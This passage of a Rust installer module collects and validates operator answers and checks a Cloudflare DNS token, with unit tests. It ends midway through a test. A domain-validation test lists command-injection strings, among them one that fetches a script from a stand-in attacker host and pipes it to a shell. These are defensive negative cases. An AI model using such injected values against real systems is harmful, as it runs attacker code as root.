//! Everything the operator tells the installer (spec R3 A1, R3 A8).
//!
//! Collected once, up front, before anything is generated or destroyed --
//! so that a run which is going to fail on a missing answer fails while it
//! still costs nothing.

use crate::prompt::PromptIo;
use crate::sso::{self, SsoDecision};

// Every app in ferrum's catalog. Must stay on ONE line: nix/modules/flake/
// checks.nix does a line lookup against it, the same way it does for
// forms.js's SUPPORTED_TYPES, because Nix's regex engine rejects the
// bracket-negation forms a multi-line parse would need. That check is what
// stops this list drifting from modules/lib/catalog.nix -- a drift whose
// symptom is an app the operator simply cannot install.
pub const CATALOG_APPS: &[&str] = &[
    "jellyfin",
    "plex",
    "prowlarr",
    "qbittorrent",
    "radarr",
    "sabnzbd",
    "sonarr",
];

/// Apps that need the Cloudflare DNS-01 credential once published.
///
/// Any public app does, so this is really "did they pick anything at all";
/// `modules/proxy/acme.nix` asserts `publicApps == {} || credentialProvided`.
pub fn needs_acme_credential(apps: &[String]) -> bool {
    !apps.is_empty()
}

/// A secret that cannot be printed by accident.
///
/// The Cloudflare token is the one genuinely high-value credential this
/// installer handles -- it grants DNS-zone-wide manipulation. Transport
/// discipline (stdin only, never argv, never persisted) was already
/// correct, but `#[derive(Debug)]` on the struct holding it meant a single
/// future `dbg!(&answers)` would leak it with no test to catch that.
#[derive(Clone, PartialEq, Eq)]
pub struct Secret(String);

impl Secret {
    pub fn new(value: String) -> Self {
        Self(value)
    }
    pub fn expose(&self) -> &str {
        &self.0
    }
}

impl std::fmt::Debug for Secret {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str("<redacted>")
    }
}

#[derive(Debug, PartialEq, Eq)]
pub struct Answers {
    pub hostname: String,
    pub base_domain: Option<String>,
    pub acme_email: Option<String>,
    pub sso: SsoDecision,
    pub apps: Vec<String>,
    /// The Cloudflare DNS-01 token, held in memory only. Never written to
    /// a file on the operator's machine and never logged; it reaches the
    /// host through `ferrum-apply put-secret` during stage 2.
    pub cloudflare_token: Option<Secret>,
}

/// A hostname must be a DNS label: it becomes `networking.hostName` and
/// the subdomain apps are published under.
fn validate_hostname(raw: &str) -> anyhow::Result<String> {
    let h = raw.trim().to_lowercase();
    if h.is_empty() || h.len() > 63 {
        anyhow::bail!("hostname must be 1-63 characters");
    }
    if !h.chars().all(|c| c.is_ascii_alphanumeric() || c == '-') {
        anyhow::bail!("hostname {h:?} may contain only letters, digits and '-'");
    }
    if h.starts_with('-') || h.ends_with('-') {
        anyhow::bail!("hostname {h:?} must not start or end with '-'");
    }
    Ok(h)
}

/// The ACME contact address. Same discipline as the SSO admin address.
///
/// # Errors
/// When the address is not usable.
fn validate_acme_email(raw: &str) -> anyhow::Result<String> {
    crate::sso::validate_email(raw)
}

/// Validates a base domain as an **allowlist**, not a typo-catcher.
///
/// This value is interpolated into commands that run as root on the target
/// (`verify::auth_checks`'s curl, among others). Rejecting whitespace and a
/// missing dot is not a safety property: backticks, `$`, `;`, `|`, `&` and
/// quotes all pass that. So only the characters a DNS name may actually
/// contain are permitted, and each label is checked.
///
/// # Errors
/// When the value is not a syntactically valid domain name.
fn validate_domain(raw: &str) -> anyhow::Result<String> {
    let d = raw.trim().to_lowercase();
    if d.is_empty() || d.len() > 253 {
        anyhow::bail!("{d:?} is not a domain name");
    }
    if !d.contains('.') || d.starts_with('.') || d.ends_with('.') {
        anyhow::bail!("{d:?} is not a domain name");
    }
    if !d
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-')
    {
        anyhow::bail!(
            "{d:?} contains characters that are not allowed in a domain name \
             (letters, digits, '.' and '-' only)"
        );
    }
    for label in d.split('.') {
        if label.is_empty() || label.len() > 63 {
            anyhow::bail!("{d:?} has a label that is empty or too long");
        }
        if label.starts_with('-') || label.ends_with('-') {
            anyhow::bail!("{d:?} has a label starting or ending with '-'");
        }
    }
    Ok(d)
}

/// Parses an app selection: names, or `all`, or empty for none.
///
/// # Errors
/// Names every unrecognised entry at once rather than one per retry.
pub fn parse_app_selection(raw: &str) -> anyhow::Result<Vec<String>> {
    let raw = raw.trim();
    if raw.is_empty() {
        return Ok(Vec::new());
    }
    if raw.eq_ignore_ascii_case("all") {
        return Ok(CATALOG_APPS.iter().map(|s| s.to_string()).collect());
    }
    let picked: Vec<String> = raw
        .split([',', ' '])
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .map(str::to_lowercase)
        .collect();
    let unknown: Vec<&str> = picked
        .iter()
        .map(String::as_str)
        .filter(|a| !CATALOG_APPS.contains(a))
        .collect();
    if !unknown.is_empty() {
        anyhow::bail!(
            "not in the catalog: {}. Available: {}",
            unknown.join(", "),
            CATALOG_APPS.join(", ")
        );
    }
    let mut sorted = picked;
    sorted.sort();
    sorted.dedup();
    Ok(sorted)
}

/// Asks a question until the answer validates, or gives up after three
/// tries so a scripted or confused session cannot loop forever.
fn ask_valid<T>(
    io: &mut impl PromptIo,
    question: &str,
    validate: impl Fn(&str) -> anyhow::Result<T>,
) -> anyhow::Result<T> {
    for attempt in 0..3 {
        let raw = io.ask(question)?;
        match validate(&raw) {
            Ok(v) => return Ok(v),
            Err(e) if attempt < 2 => io.say(&format!("  {e}")),
            Err(e) => return Err(e),
        }
    }
    unreachable!("the loop returns or errors on its last iteration")
}

/// Collects every operator answer.
///
/// # Arguments
/// * `io` - the question-and-answer channel with the operator.
/// * `make_client` - how the Cloudflare token is checked once it has been
///   entered. Production passes [`cloudflare_client`]; tests pass a factory
///   pointed at `ferrum_dns::testing::FakeCloudflare`, because the sandbox
///   that runs the suite has no network and must never reach the real API.
///
/// # Errors
/// An input failure, an answer that fails validation three times, a
/// declined SSO confirmation (see `sso::decide`), or a Cloudflare token
/// that cannot manage records for the base domain.
pub fn collect(io: &mut impl PromptIo, make_client: ClientFactory<'_>) -> anyhow::Result<Answers> {
    let hostname = ask_valid(io, "Hostname for this machine:", validate_hostname)?;

    io.say(
        "\nA base domain publishes each app at <app>.<domain> with a real \
         certificate.\nLeave it empty for a host reachable only from this \
         network.",
    );
    let raw_domain = io.ask("Base domain (empty for none):")?;
    let base_domain = if raw_domain.trim().is_empty() {
        None
    } else {
        Some(validate_domain(&raw_domain)?)
    };

    let acme_email = match &base_domain {
        Some(_) => Some(ask_valid(
            io,
            "Email for Let's Encrypt expiry notices:",
            validate_acme_email,
        )?),
        None => None,
    };

    io.say(&format!("\nCatalog apps: {}", CATALOG_APPS.join(", ")));
    let apps = ask_valid(
        io,
        "Apps to enable (comma separated, 'all', or empty for none):",
        parse_app_selection,
    )?;

    let sso = sso::decide(base_domain.as_deref(), &apps, io)?;

    // Asked last, and only when it is genuinely required, so an operator
    // exploring the questions is never prompted for a credential they do
    // not yet need.
    let cloudflare_token = match base_domain.as_deref() {
        Some(domain) if needs_acme_credential(&apps) => {
            io.say(
                "\nLet's Encrypt issues these certificates over DNS-01, and ferrum \
                 publishes each app's\nDNS record with the same credential, so it needs \
                 a Cloudflare API token scoped\nZone:Read + DNS:Edit on this domain. It \
                 is held in memory, written to no file here,\nand encrypted to the \
                 host's own key once the host exists.\n\nIt is checked against \
                 Cloudflare as soon as you enter it, so a token that cannot\nsee this \
                 domain fails here rather than after the install.",
            );
            Some(validate_and_verify_cloudflare_token(
                &io.ask_secret("Cloudflare API token:")?,
                domain,
                make_client,
            )?)
        }
        _ => None,
    };

    Ok(Answers {
        hostname,
        base_domain,
        acme_email,
        sso,
        apps,
        cloudflare_token,
    })
}

/// Rebuilds the answers from a generated `settings.stage2.json`.
///
/// A resume after the disk has been erased must never re-prompt: the
/// operator answered these questions before anything was destroyed, and
/// asking again invites a different answer against a half-installed
/// machine. The one thing that cannot be recovered is the Cloudflare
/// token, which was deliberately never written anywhere -- the caller
/// re-asks for that alone, and only if it is still needed.
///
/// # Errors
/// Malformed JSON, or a document with no hostname to recover.
/// Validates a Cloudflare API token before it can reach ACME.
///
/// The token becomes the value of an HTTP `Authorization` header. Any
/// character that cannot appear in a header field makes every certificate
/// order fail, and the failure surfaces far away from its cause: on the
/// first real install it appeared as
///
///   acme: error presenting token: cloudflare: failed to find zone
///   thesyms.ca.: ... net/http: invalid header field value for
///   "Authorization"
///
/// which reads like a DNS or zone problem rather than a bad paste. The
/// actual cause was a trailing `%` -- zsh's marker for output with no
/// final newline, copied along with the token out of a terminal.
///
/// Validated here, at the one place a human types it, rather than
/// anywhere further in: by the time it is a sops file on the host it has
/// been encrypted, shipped and referenced by a systemd unit, and the
/// error no longer names it.
///
/// # Arguments
/// * `raw` - what the operator typed or pasted.
///
/// # Returns
/// The trimmed token.
///
/// # Errors
/// When it is empty, or contains anything outside the character set
/// Cloudflare issues -- naming the offending character, since it is
/// usually invisible.
pub fn validate_cloudflare_token(raw: &str) -> anyhow::Result<String> {
    let token = raw.trim();
    if token.is_empty() {
        anyhow::bail!(
            "a Cloudflare DNS-01 token is required to publish an app: \
             modules/proxy/acme.nix refuses to build without it"
        );
    }
    // An allowlist. Cloudflare issues tokens from exactly this set, and
    // this value ends up in an HTTP header where anything else is fatal.
    if let Some(bad) = token
        .chars()
        .find(|c| !(c.is_ascii_alphanumeric() || *c == '_' || *c == '-'))
    {
        anyhow::bail!(
            "that Cloudflare token contains {bad:?} ({:#06x}), which cannot \
             appear in an HTTP Authorization header -- every certificate \
             order would fail with \"invalid header field value\", and the \
             error would name DNS rather than the token.\n\n\
             If you copied it from a terminal, check for a trailing \"%\" \
             (zsh's marker for output with no final newline) or a stray \
             space. A Cloudflare API token is letters, digits, underscores \
             and hyphens only.",
            bad as u32
        );
    }
    if token.len() < 20 {
        anyhow::bail!(
            "that Cloudflare token is only {} characters, which is too short \
             to be one. Tokens are issued from the Cloudflare dashboard \
             under My Profile -> API Tokens, scoped Zone:Read + DNS:Edit.",
            token.len()
        );
    }
    Ok(token.to_string())
}

/// How token verification reaches Cloudflare.
///
/// The client is built *from* the token, so the seam is a factory rather
/// than a client: production hands over [`cloudflare_client`], and tests
/// hand over a factory pointed at `ferrum_dns::testing::FakeCloudflare`.
/// The Nix sandbox running the workspace suite has no network at all, so a
/// test that reached the real API would fail CI by construction.
pub type ClientFactory<'a> = &'a dyn Fn(ferrum_dns::Secret) -> ferrum_dns::client::Client;

/// The production factory: a client pointed at the real Cloudflare API.
///
/// # Arguments
/// * `token` - the bare token the operator just entered.
///
/// # Returns
/// A client every call site of [`validate_and_verify_cloudflare_token`]
/// shares, so there is one place the endpoint and timeouts are decided.
#[must_use]
pub fn cloudflare_client(token: ferrum_dns::Secret) -> ferrum_dns::client::Client {
    ferrum_dns::client::Client::new(token)
}

/// Both halves of A5's check: the token is well-formed **and** Cloudflare
/// agrees it can manage records for this domain.
///
/// This is the only way a [`Secret`] holding a Cloudflare token is minted
/// in this binary, and that is the point. The installer has two places it
/// asks for the token -- the first interactive run, and a resume after the
/// disk has been erased -- and until this function existed only the first
/// ran even the syntactic check (UF-20). The resumed path is the likelier
/// one after the failure that loses a credential, so the verification was
/// missing exactly where it mattered most.
///
/// Order matters. The syntactic checks run first and refuse an empty,
/// whitespace-only or malformed value **before** any request is made. An
/// unset credential producing an empty request that Cloudflare answers
/// blandly is the failure mode this whole story exists to remove: an empty
/// answer reads exactly like "not supported", and a wrong conclusion
/// reached confidently from a silent failure is worse than an error.
///
/// Zone resolution is a longest-suffix match over every zone the token can
/// see (decision D-06), not `GET /zones?name=<base_domain>`:
/// `modules/core/options.nix` documents `home.example.com` as a base
/// domain, and the exact-name form would reject a perfectly good token
/// scoped to `example.com`.
///
/// # Arguments
/// * `raw` - what the operator typed or pasted.
/// * `base_domain` - `ferrum.proxy.baseDomain`, the domain the records
///   will be published under.
/// * `make_client` - the factory described on [`ClientFactory`].
///
/// # Returns
/// The trimmed token, wrapped so it cannot be printed by accident.
///
/// # Errors
/// The syntactic failures of [`validate_cloudflare_token`], or a distinct
/// message per verification failure: Cloudflare refusing the credential,
/// no visible zone covering the domain, the domain being delegated to
/// other nameservers, and the API being unreachable. Each has a different
/// remedy, so each says a different thing.
pub fn validate_and_verify_cloudflare_token(
    raw: &str,
    base_domain: &str,
    make_client: ClientFactory<'_>,
) -> anyhow::Result<Secret> {
    let token = validate_cloudflare_token(raw)?;
    let client = make_client(ferrum_dns::Secret::new(token.clone()));
    match client.verify_zone_access(base_domain) {
        Ok(()) => Ok(Secret::new(token)),
        Err(failure) => Err(explain_verification_failure(&failure, base_domain)),
    }
}

/// Where the credential lives once a host exists, named exactly.
///
/// Worth stating rather than paraphrasing: it is not a bare token on the
/// host. It is the sops secret named by `ferrum.proxy.acme.credentialSecret`
/// and it is a systemd `EnvironmentFile`, so its content is a `KEY=value`
/// line. An operator told to "check the token file" who then pastes a bare
/// value into it has produced a file every reader will parse as empty.
const CREDENTIAL_LOCATION: &str = "On a host ferrum has already installed this credential is the \
     sops secret named by ferrum.proxy.acme.credentialSecret (default \
     \"acme-dns\"). It is mounted at /run/secrets/acme-dns and is a systemd \
     EnvironmentFile, so its content is the single line \
     CLOUDFLARE_DNS_API_TOKEN=<token> -- not a bare token.";

/// Turns a `ferrum-dns` failure into something the operator can act on.
///
/// Four failures arrive here and they have four different remedies: issue a
/// new token, add the zone to this Cloudflare account, undo an `NS`
/// delegation, or fix the network. Rendering them all as "invalid token"
/// would send the operator to re-issue a credential that was never the
/// problem.
///
/// # Arguments
/// * `failure` - what `verify_zone_access` returned.
/// * `base_domain` - the domain that was being checked, for the message.
///
/// # Returns
/// An error whose text names the cause and the fix. Never the token: it
/// travels only in the `Authorization` header, and `CloudflareError`'s own
/// `Display` is written to the same rule.
fn explain_verification_failure(
    failure: &ferrum_dns::CloudflareError,
    base_domain: &str,
) -> anyhow::Error {
    use ferrum_dns::CloudflareError as E;
    match failure {
        E::Api { code, message } => anyhow::anyhow!(
            "Cloudflare rejected that API token (its own error {code}: {message}).\n\n\
             The token must exist, be unexpired, and be scoped Zone:Read + DNS:Edit on \
             the zone that contains {base_domain}. Re-issue it in the Cloudflare \
             dashboard under My Profile -> API Tokens.\n\n{CREDENTIAL_LOCATION}"
        ),
        E::ZoneNotFound { .. } => anyhow::anyhow!(
            "That token was accepted, but no Cloudflare zone it can see covers \
             {base_domain}, so it cannot publish any of this host's records.\n\n\
             ferrum matches the longest zone name that is a suffix of the domain, so a \
             token scoped to \"example.com\" is correct for a base domain of \
             \"home.example.com\". This means neither {base_domain} nor any parent of \
             it is a zone in the account this token belongs to.\n\n\
             Check that the domain is in this Cloudflare account, and that the token's \
             Zone Resources include that zone rather than a different one."
        ),
        E::ZoneDelegated {
            delegated_name,
            nameservers,
            ..
        } => anyhow::anyhow!(
            "{base_domain} sits in a Cloudflare zone this token can manage, but an NS \
             record for {delegated_name} delegates it to {}. Records written in \
             Cloudflare would be accepted and would resolve nowhere, because the \
             servers the world asks are not the ones ferrum would be writing to.\n\n\
             Either remove that NS delegation so Cloudflare serves {base_domain}, or \
             choose a base domain that is not delegated away.",
            if nameservers.is_empty() {
                "other nameservers".to_string()
            } else {
                nameservers.join(", ")
            }
        ),
        E::Transport(detail) => anyhow::anyhow!(
            "Could not reach the Cloudflare API to check that token ({detail}).\n\n\
             The token has NOT been checked, and it is not accepted on trust: checking \
             it here is what stops a bad credential surfacing hours later as an install \
             that finished and published nothing. Restore this machine's network path \
             to api.cloudflare.com and run the installer again."
        ),
        E::Malformed(detail) => anyhow::anyhow!(
            "Cloudflare answered the token check with something this installer could \
             not read ({detail}).\n\n\
             The token has NOT been checked, so it is refused rather than accepted on \
             trust. If api.cloudflare.com is reachable only through a proxy that \
             rewrites responses, that proxy is the thing to fix."
        ),
    }
}

pub fn from_stage2(body: &str, hostname: &str) -> anyhow::Result<Answers> {
    let doc: serde_json::Value = serde_json::from_str(body)?;
    let sso_enabled = doc
        .pointer("/auth/enable")
        .and_then(serde_json::Value::as_bool)
        .unwrap_or(false);
    let mut apps: Vec<String> = doc
        .get("apps")
        .and_then(serde_json::Value::as_object)
        .map(|m| m.keys().cloned().collect())
        .unwrap_or_default();
    apps.sort();

    // EVERY field is re-validated, exactly as a fresh run validates it.
    //
    // This file lives in the operator's bind mount and the installer tells
    // them in as many words that the repository is theirs -- so between an
    // interrupted run and a resume it can legitimately have been edited by
    // hand, or by anything else with write access to that directory. A
    // resume that skipped validation would accept a domain a fresh run
    // would reject, and that value goes on to be interpolated into remote
    // commands. "Don't re-ask" must never become "don't re-check."
    let base_domain = match doc
        .pointer("/proxy/baseDomain")
        .and_then(serde_json::Value::as_str)
    {
        Some(d) => Some(validate_domain(d)?),
        None => None,
    };
    let acme_email = match doc
        .pointer("/proxy/acme/email")
        .and_then(serde_json::Value::as_str)
    {
        Some(e) => Some(validate_acme_email(e)?),
        None => None,
    };
    let admin_email = match doc
        .pointer("/auth/adminEmail")
        .and_then(serde_json::Value::as_str)
    {
        Some(e) => Some(crate::sso::validate_email(e)?),
        None => None,
    };
    if sso_enabled && admin_email.is_none() {
        anyhow::bail!(
            "the recovered settings enable authentication but name no admin \
             email; modules/proxy/authelia.nix asserts it is non-empty"
        );
    }
    let unknown: Vec<&str> = apps
        .iter()
        .map(String::as_str)
        .filter(|a| !CATALOG_APPS.contains(a))
        .collect();
    if !unknown.is_empty() {
        anyhow::bail!(
            "the recovered settings enable apps that are not in the catalog: {}",
            unknown.join(", ")
        );
    }
    let hostname = validate_hostname(hostname)?;

    Ok(Answers {
        hostname,
        base_domain,
        acme_email,
        sso: SsoDecision {
            enabled: sso_enabled,
            // Never recovered from disk: consent is a fact about what the
            // operator was shown and typed, not a property of a file that
            // anything with write access could add.
            unauthenticated_accepted_for: Vec::new(),
            admin_email,
        },
        apps,
        cloudflare_token: None,
    })
}

/// Whether a resumed run still needs the Cloudflare token.
///
/// It does only when the host publishes something and the encrypted file
/// is not already on the target from an earlier attempt.
pub fn token_still_needed(a: &Answers, already_on_host: bool) -> bool {
    a.base_domain.is_some() && needs_acme_credential(&a.apps) && !already_on_host
}

#[cfg(test)]
mod tests {
    /// The real failure: a token pasted out of a zsh terminal carried the
    /// shell's trailing "%" -- its marker for output with no final
    /// newline. It encrypted, shipped and installed fine, then every
    /// certificate order failed with "invalid header field value for
    /// Authorization", reported as a DNS zone problem.
    ///
    /// Mutation check: drop the charset check and this fails.
    #[test]
    fn a_token_carrying_a_shell_artifact_is_refused_with_the_reason() {
        let err = super::validate_cloudflare_token("abcdefghij1234567890abcdefghij1234567890%")
            .expect_err("a trailing % cannot go in an HTTP header");
        let msg = err.to_string();
        assert!(msg.contains("Authorization"), "{msg}");
        // It must name the likely cause, because the character is invisible.
        assert!(msg.contains("zsh"), "{msg}");

        // Whitespace is trimmed rather than refused -- a stray newline or
        // space around a paste is not the operator's mistake to fix twice.
        assert_eq!(
            super::validate_cloudflare_token("  abcdefghij1234567890abcdefghij1234567890 \n")
                .unwrap(),
            "abcdefghij1234567890abcdefghij1234567890"
        );

        // Interior whitespace is a real problem and is refused.
        assert!(
            super::validate_cloudflare_token("abcdefghij12345 67890abcdefghij12345678").is_err()
        );

        // Too short to be a token at all.
        let short = super::validate_cloudflare_token("abc")
            .unwrap_err()
            .to_string();
        assert!(short.contains("too short"), "{short}");

        // A real one passes untouched.
        let good = "aBcD_eFgH-1234567890aBcDeFgH1234567890xy";
        assert_eq!(super::validate_cloudflare_token(good).unwrap(), good);
    }

    use super::*;
    use crate::prompt::testing::Scripted;
    use ferrum_dns::testing::{CannedResponse, FakeCloudflare, Route, TEST_TOKEN};

    /// The zone every test that is not *about* the zone check wants: one
    /// visible zone covering `thesyms.ca`, delegated nowhere.
    ///
    /// Scripted answers are consumed one per request, so a run that made a
    /// call nobody expected gets the fake's loud "nothing scripted" refusal
    /// rather than a plausible success.
    fn script_healthy_zone(fake: &FakeCloudflare) {
        fake.script(
            Route::get("/zones"),
            CannedResponse::ok(serde_json::json!([{
                "id": "z1",
                "name": "thesyms.ca",
                "name_servers": ["amber.ns.cloudflare.com", "bob.ns.cloudflare.com"],
            }])),
        );
        fake.script(
            Route::get("/zones/z1/dns_records"),
            CannedResponse::ok(serde_json::json!([])),
        );
    }

    /// A fake Cloudflare that accepts any well-formed token for
    /// `thesyms.ca`.
    fn healthy_cloudflare() -> FakeCloudflare {
        let fake = FakeCloudflare::start();
        script_healthy_zone(&fake);
        fake
    }

    /// A factory pointing `Client` at the fake instead of the real API.
    ///
    /// Every test in this module goes through this: the Nix sandbox that
    /// runs the workspace suite has no network, so a test reaching
    /// api.cloudflare.com would fail CI by construction -- and would be
    /// checking Cloudflare's availability rather than this code.
    fn verifying_against(
        fake: &FakeCloudflare,
    ) -> impl Fn(ferrum_dns::Secret) -> ferrum_dns::client::Client + '_ {
        let base_url = fake.base_url().to_string();
        move |token| ferrum_dns::client::Client::with_base_url(token, base_url.clone())
    }

    #[test]
    fn hostnames_must_be_dns_labels() {
        assert_eq!(validate_hostname(" Saltbox ").unwrap(), "saltbox");
        for bad in ["", "-a", "a-", "a b", "a_b", "a.b", &"x".repeat(64)] {
            assert!(validate_hostname(bad).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn domains_must_look_like_domains() {
        assert_eq!(validate_domain(" TheSyms.ca ").unwrap(), "thesyms.ca");
        for bad in [
            "localhost",
            ".a.com",
            "a.com.",
            "a b.com",
            // The shapes that matter: this value reaches a remote root shell.
            "example.com;curl$IFS-sattacker/p|sh",
            "a.com`id`",
            "a.com$(id)",
            "a.com|id",
            "a.com&id",
            "a.com'x'",
            "a.com\"x\"",
            "-a.com",
            "a-.com",
            "a..com",
        ] {
            assert!(validate_domain(bad).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn app_selection_accepts_names_all_and_nothing() {
        assert_eq!(parse_app_selection("").unwrap(), Vec::<String>::new());
        assert_eq!(
            parse_app_selection("ALL").unwrap().len(),
            CATALOG_APPS.len()
        );
        assert_eq!(
            parse_app_selection("sonarr, radarr").unwrap(),
            vec!["radarr", "sonarr"]
        );
        assert_eq!(parse_app_selection("plex plex").unwrap(), vec!["plex"]);
    }

    #[test]
    fn an_unknown_app_names_itself_and_the_alternatives() {
        let err = parse_app_selection("sonarr, radar")
            .unwrap_err()
            .to_string();
        assert!(err.contains("radar"), "{err}");
        assert!(
            err.contains("radarr"),
            "the real name should be listed: {err}"
        );
        assert!(
            !err.contains("sonarr,"),
            "should not implicate the valid one: {err}"
        );
    }

    #[test]
    fn a_full_interactive_run_collects_everything() {
        let mut io = Scripted::new(&[
            "saltbox",
            "thesyms.ca",
            "me@thesyms.ca",
            "sonarr, plex",
            "", // SSO: default yes
            "admin@thesyms.ca",
            "cftokenvalue1234567890abcdefghijklmnopqr",
        ]);
        let fake = healthy_cloudflare();
        let a = collect(&mut io, &verifying_against(&fake)).unwrap();
        assert_eq!(a.hostname, "saltbox");
        assert_eq!(a.base_domain.as_deref(), Some("thesyms.ca"));
        assert_eq!(a.apps, vec!["plex", "sonarr"]);
        assert!(a.sso.enabled);
        assert_eq!(
            a.cloudflare_token.as_ref().map(Secret::expose),
            Some("cftokenvalue1234567890abcdefghijklmnopqr")
        );
    }

    /// No domain means nothing is published, so neither ACME nor the token
    /// is asked for -- an operator exploring the questions is never
    /// prompted for a credential they do not need.
    #[test]
    fn no_domain_skips_acme_and_the_token() {
        let mut io = Scripted::new(&["saltbox", "", "plex"]);
        let fake = FakeCloudflare::start();
        let a = collect(&mut io, &verifying_against(&fake)).unwrap();
        assert_eq!(a.base_domain, None);
        assert_eq!(a.acme_email, None);
        assert_eq!(a.cloudflare_token, None);
        assert!(!a.sso.enabled);
        let t = io.transcript();
        assert!(!t.contains("Cloudflare"), "should not have asked: {t}");
    }

    /// A domain with no apps publishes nothing, so acme.nix's assertion
    /// never fires and the token is not required.
    #[test]
    fn a_domain_with_no_apps_does_not_require_the_token() {
        let mut io = Scripted::new(&["saltbox", "thesyms.ca", "me@thesyms.ca", "", "", "a@b.co"]);
        let fake = FakeCloudflare::start();
        let a = collect(&mut io, &verifying_against(&fake)).unwrap();
        assert!(a.apps.is_empty());
        assert_eq!(a.cloudflare_token, None);
        assert!(
            fake.requests().is_empty(),
            "nothing was collected to check, so nothing should have been asked of Cloudflare"
        );
    }

    /// D-11(b). An unset credential must be an error with a message, never
    /// an empty success.
    ///
    /// The owner's first attempt at this failed exactly that way: a missing
    /// file left the token empty, every request went out unauthenticated,
    /// and the blank result read as "the feature is unsupported" -- a wrong
    /// conclusion reached confidently from a silent failure. So the empty
    /// value is refused *before* a request is made, and the refusal says
    /// why.
    ///
    /// Mutation check: make `validate_cloudflare_token` return `Ok` for an
    /// empty string and this fails on both counts -- the collect succeeds,
    /// and the fake records a request it should never have seen.
    #[test]
    fn an_empty_token_is_refused_with_the_reason_and_never_reaches_the_api() {
        let fake = healthy_cloudflare();
        for blank in ["", "   ", "\t"] {
            let mut io = Scripted::new(&[
                "saltbox",
                "thesyms.ca",
                "me@thesyms.ca",
                "sonarr",
                "",
                "a@b.co",
                blank,
            ]);
            let err = collect(&mut io, &verifying_against(&fake))
                .unwrap_err()
                .to_string();
            assert!(err.contains("acme.nix"), "{blank:?}: {err}");
            assert!(err.contains("required"), "{blank:?}: {err}");
        }
        assert!(
            fake.requests().is_empty(),
            "an empty credential must fail at the prompt, not become an \
             unauthenticated request whose blank answer reads as \"unsupported\""
        );
    }

    /// The token must never be written anywhere on the operator's machine.
    /// Debug is the easiest accidental leak, so assert the shape we keep.
    #[test]
    fn the_token_is_only_ever_held_in_memory() {
        let mut io = Scripted::new(&[
            "saltbox",
            "thesyms.ca",
            "me@thesyms.ca",
            "sonarr",
            "",
            "a@b.co",
            "secrettoken1234567890abcdefghijklmnopqrs",
        ]);
        let fake = healthy_cloudflare();
        let a = collect(&mut io, &verifying_against(&fake)).unwrap();
        assert!(
            !io.transcript()
                .contains("secrettoken1234567890abcdefghijklmnopqrs"),
            "the token must never be echoed back: {}",
            io.transcript()
        );
        assert_eq!(
            a.cloudflare_token.as_ref().map(Secret::expose),
            Some("secrettoken1234567890abcdefghijklmnopqrs")
        );
    }

    /// A resume must never re-prompt: the operator answered before
    /// anything was destroyed.
    #[test]
    fn answers_are_recovered_from_the_generated_stage_two_document() {
        let doc = serde_json::json!({
            "schemaVersion": 1,
            "proxy": { "enable": true, "baseDomain": "thesyms.ca", "acme": { "email": "me@thesyms.ca" } },
            "apps": { "sonarr": { "enable": true }, "plex": { "enable": true } },
            "auth": { "enable": true, "adminEmail": "admin@thesyms.ca" }
        });
        let a = from_stage2(&doc.to_string(), "saltbox").unwrap();
        assert_eq!(a.hostname, "saltbox");
        assert_eq!(a.base_domain.as_deref(), Some("thesyms.ca"));
        assert_eq!(a.apps, vec!["plex", "sonarr"]);
        assert!(a.sso.enabled);
        assert_eq!(a.sso.admin_email.as_deref(), Some("admin@thesyms.ca"));
    }

    /// The token was deliberately never written anywhere, so it cannot be
    /// recovered -- and must not be silently treated as absent-and-fine.
    #[test]
    fn the_token_is_never_recovered_from_disk() {
        let doc = serde_json::json!({ "apps": { "sonarr": { "enable": true } } });
        let a = from_stage2(&doc.to_string(), "h").unwrap();
        assert_eq!(a.cloudflare_token, None);
    }

    #[test]
    fn a_resume_re_asks_for_the_token_only_when_it_is_still_needed() {
        let doc = serde_json::json!({
            "proxy": { "enable": true, "baseDomain": "d.com" },
            "apps": { "sonarr": { "enable": true } }
        });
        let a = from_stage2(&doc.to_string(), "h").unwrap();
        assert!(token_still_needed(&a, false));
        assert!(!token_still_needed(&a, true), "already delivered");

        let no_apps = from_stage2(
            &serde_json::json!({ "proxy": { "baseDomain": "d.com" }, "apps": {} }).to_string(),
            "h",
        )
        .unwrap();
        assert!(!token_still_needed(&no_apps, false));
    }

    #[test]
    fn a_recovered_document_without_auth_reads_as_sso_off() {
        let a = from_stage2(&serde_json::json!({ "apps": {} }).to_string(), "h").unwrap();
        assert!(!a.sso.enabled);
    }

    /// One `dbg!(&answers)` away from a leak, before this.
    /// On screen, in scrollback, in a screen-share. Not worth it for the
    /// one credential here that grants DNS-zone-wide control.
    #[test]
    fn the_token_is_asked_for_without_echo() {
        let mut io = Scripted::new(&[
            "saltbox",
            "thesyms.ca",
            "me@thesyms.ca",
            "sonarr",
            "",
            "a@b.co",
            "tokentokentoken1234567890abcdefghijklmno",
        ]);
        let fake = healthy_cloudflare();
        collect(&mut io, &verifying_against(&fake)).unwrap();
        assert_eq!(
            io.secret_asks.len(),
            1,
            "the token must use the non-echoing prompt"
        );
        assert!(io.secret_asks[0].contains("Cloudflare"));
    }

    #[test]
    fn the_token_cannot_be_printed_by_debug() {
        let mut io = Scripted::new(&[
            "saltbox",
            "thesyms.ca",
            "me@thesyms.ca",
            "sonarr",
            "",
            "a@b.co",
            "supersecret1234567890abcdefghijklmnopqrs",
        ]);
        let fake = healthy_cloudflare();
        let a = collect(&mut io, &verifying_against(&fake)).unwrap();
        let rendered = format!("{a:?}");
        assert!(
            !rendered.contains("supersecret1234567890abcdefghijklmnopqrs"),
            "Debug leaked the token: {rendered}"
        );
        assert!(rendered.contains("<redacted>"), "{rendered}");
        // ...and it is still retrievable where it is genuinely needed.
        assert_eq!(
            a.cloudflare_token.as_ref().map(Secret::expose),
            Some("supersecret1234567890abcdefghijklmnopqrs")
        );
    }

    /// The only credential these tests transmit: the fake's own dummy,
    /// which is well-formed enough to pass the syntactic checks and
    /// self-describing enough that a stray capture is obviously harmless.
    const GOOD_TOKEN: &str = TEST_TOKEN;

    /// A5's happy path, and the proof that the check is a real call rather
    /// than a comment: the fake sees the zone listing, and the token
    /// travels only in the `Authorization` header.
    #[test]
    fn a_token_that_can_see_the_zone_is_accepted_and_actually_checked() {
        let fake = healthy_cloudflare();
        let token = validate_and_verify_cloudflare_token(
            GOOD_TOKEN,
            "thesyms.ca",
            &verifying_against(&fake),
        )
        .expect("a token scoped to the zone is accepted");
